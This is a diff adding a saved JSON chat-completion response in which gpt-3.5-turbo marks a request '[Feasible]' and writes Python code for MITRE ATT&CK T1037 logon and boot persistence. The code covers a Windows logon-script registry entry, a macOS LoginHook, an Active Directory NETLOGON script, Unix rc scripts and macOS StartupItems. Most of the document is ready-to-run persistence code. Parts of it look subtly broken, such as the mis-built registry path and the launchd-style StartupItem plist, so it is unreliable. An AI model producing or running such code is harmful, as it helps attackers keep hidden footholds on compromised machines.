@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8R2nWeQ8fVNm6LA3qwRVkdSkWpKet",
+  "object":"chat.completion",
+  "created":1701456302,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\n\nT1037-Boot or Logon Initialization Scripts\n\nMethod 1: Windows Logon Script\nPackages used: None\n\n```python\nimport os\n\ndef add_logon_script(script_path):\n    registry_path = r'HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript'\n    os.system(f'reg add \"{registry_path}\" /v script_name /t REG_SZ /d \"{script_path}\" /f')\n\ndef remove_logon_script():\n    registry_path = r'HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript'\n    os.system(f'reg delete \"{registry_path}\" /v script_name /f')\n\n# Add logon script\nadd_logon_script('C:\\\\Path\\\\to\\\\script.bat')\n\n# Remove logon script\nremove_logon_script()\n```\n\nMethod 2: macOS Login Hook\nPackages used: None\n\n```python\nimport os\n\ndef add_login_hook(script_path):\n    plist_cmd = f'defaults write /Library/Preferences/com.apple.loginwindow LoginHook {script_path}'\n    os.system(plist_cmd)\n\ndef remove_login_hook():\n    plist_cmd = 'defaults delete /Library/Preferences/com.apple.loginwindow LoginHook'\n    os.system(plist_cmd)\n\n# Add login hook\nadd_login_hook('/Path/to/script.sh')\n\n# Remove login hook\nremove_login_hook()\n```\n\nMethod 3: Network Logon Script (Active Directory)\nPackages used: None\n\n```python\nimport os\n\ndef assign_logon_script(script_path):\n    script_name = 'login_script.bat'\n    os.system(f'copy \"{script_path}\" \"\\\\\\\\domaincontroller\\\\NETLOGON\\\\{script_name}\"')\n    os.system(f'wmic path Win32_UserAccount where Name=\"username\" set ScriptPath=\"\\\\\\\\domaincontroller\\\\NETLOGON\\\\{script_name}\"')\n\ndef remove_logon_script():\n    os.system('wmic path Win32_UserAccount where Name=\"username\" set ScriptPath=\"\"')\n\n# Assign logon script\nassign_logon_script('C:\\\\Path\\\\to\\\\script.bat')\n\n# Remove logon script\nremove_logon_script()\n```\n\nMethod 4: Unix-like RC Script\nPackages used: None\n\n```python\nimport os\n\ndef modify_rc_script(runlevel, script_path):\n    rc_script_path = f'/etc/rc.d/rc{runlevel}.d'\n    script_name = 'S99custom'\n    os.system(f'cp {script_path} {rc_script_path}/{script_name}')\n    os.system(f'chmod +x {rc_script_path}/{script_name}')\n\ndef remove_rc_script(runlevel):\n    rc_script_path = f'/etc/rc.d/rc{runlevel}.d'\n    script_name = 'S99custom'\n    os.system(f'rm {rc_script_path}/{script_name}')\n\n# Modify RC script for runlevel 3\nmodify_rc_script(3, '/Path/to/script.sh')\n\n# Remove RC script for runlevel 3\nremove_rc_script(3)\n```\n\nMethod 5: Startup Items (macOS)\nPackages used: None\n\n```python\nimport os\n\ndef create_startup_item(item_name, script_path):\n    plist_template = f'''\\\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>{item_name}</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>{script_path}</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\n'''\n    plist_path = f'/Library/StartupItems/{item_name}/{item_name}.plist'\n    os.makedirs(os.path.dirname(plist_path), exist_ok=True)\n    with open(plist_path, 'w') as f:\n        f.write(plist_template)\n\ndef remove_startup_item(item_name):\n    plist_path = f'/Library/StartupItems/{item_name}/{item_name}.plist'\n    os.system(f'rm -rf \"{plist_path}\"')\n\n# Create startup item\ncreate_startup_item('CustomStartupItem', '/Path/to/script.sh')\n\n# Remove startup item\nremove_startup_item('CustomStartupItem')\n```\n\nPlease note that the code snippets provided assume that the necessary script files already exist and are ready to be executed. You may need to adjust the file paths and script names according to your specific scenario."
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":734,
+    "completion_tokens":939,
+    "total_tokens":1673
+  },
+  "system_fingerprint":null
+}
